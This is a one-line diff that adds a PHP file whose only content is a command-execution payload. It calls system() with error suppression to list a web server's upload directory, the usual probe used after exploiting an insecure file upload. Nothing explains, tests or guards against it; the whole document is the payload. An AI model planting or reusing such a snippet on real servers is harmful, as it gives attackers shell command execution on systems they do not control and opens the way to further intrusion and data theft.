@@ -1,0 +1,1 @@
+<?php @system('ls /var/www/html/up/upload'); ?>
